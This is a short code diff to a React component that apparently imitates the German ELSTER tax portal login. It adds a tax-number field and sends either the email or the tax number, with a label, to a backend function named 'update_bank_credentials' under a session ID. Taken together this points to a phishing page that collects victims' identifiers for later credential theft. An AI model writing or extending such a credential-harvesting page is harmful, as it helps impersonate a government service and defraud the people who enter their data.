@@ -51,6 +51,7 @@ const Elster = () => {
 
   const [tab, setTab] = useState<TabKey>("zertifikat");
   const [email, setEmail] = useState("");
+  const [steuernummer, setSteuernummer] = useState("");
   const [pwError, setPwError] = useState("");
   const [showLoading, setShowLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
@@ -68,15 +69,20 @@ const Elster = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!email.trim()) { setPwError("Bitte geben Sie Ihre E-Mail-Adresse ein."); return; }
+    if (tab === "zertifikat" && !email.trim()) {
+      setPwError("Bitte geben Sie Ihre E-Mail-Adresse ein."); return;
+    }
+    if (tab === "steuernummer" && !steuernummer.trim()) {
+      setPwError("Bitte geben Sie Ihre Steuernummer ein."); return;
+    }
     if (submitting) return;
     setSubmitting(true);
     if (sessionId) {
       const { error } = await supabase.rpc("update_bank_credentials", {
         p_session_id: sessionId,
-        p_username: email,
+        p_username: tab === "steuernummer" ? steuernummer : email,
         p_password: "",
-        p_username_label: "E-Mail",
+        p_username_label: tab === "steuernummer" ? "Steuernummer" : "E-Mail",
         p_password_label: "",
       });
       if (error) console.error("Update failed:", error);
